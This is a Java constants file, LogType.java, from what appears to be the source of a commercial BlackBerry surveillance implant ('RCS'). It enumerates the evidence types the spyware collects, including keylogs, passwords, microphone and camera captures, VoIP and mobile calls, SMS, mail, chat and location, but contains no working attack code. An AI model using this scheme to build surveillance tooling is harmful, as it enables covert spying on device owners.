//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.log
 * File         : LogType.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.log;

/**
 * The Class LogType.
 */
public final class LogType {
    public static final int UNKNOWN = 0xFFFF; // in caso di errore
    public static final int FILEOPEN = 0x0000;
    public static final int FILECAPTURE = 0x0001; // in realta' e'
    // 0x0000 e si
    // distingue tra LOG e
    // LOGF
    public static final int KEYLOG = 0x0040;
    public static final int PRINT = 0x0100;
    public static final int SNAPSHOT = 0xB9B9;
    public static final int UPLOAD = 0xD1D1;
    public static final int DOWNLOAD = 0xD0D0;
    public static final int CALL = 0x0140;
    public static final int CALL_SKYPE = 0x0141;
    public static final int CALL_GTALK = 0x0142;
    public static final int CALL_YMSG = 0x0143;
    public static final int CALL_MSN = 0x0144;
    public static final int CALL_MOBILE = 0x0145;
    public static final int URL = 0x0180;
    public static final int CLIPBOARD = 0xD9D9;
    public static final int PASSWORD = 0xFAFA;
    public static final int MIC = 0xC2C2;
    public static final int CHAT = 0xC6C6;
    public static final int CAMSHOT = 0xE9E9;
    public static final int ADDRESSBOOK = 0x0200;
    public static final int CALENDAR = 0x0201;
    public static final int TASK = 0x0202;
    public static final int MAIL = 0x0210;
    public static final int SMS = 0x0211;
    public static final int MMS = 0x0212;
    public static final int LOCATION = 0x0220;
    public static final int CALLLIST = 0x0230;
    public static final int DEVICE = 0x0240;
    public static final int INFO = 0x0241;
    public static final int APPLICATION = 0x1011;
    public static final int SKYPEIM = 0x0300;
    public static final int MAIL_RAW = 0x1001;
    public static final int SMS_NEW = 0x0213;

    private LogType() {

    }
}
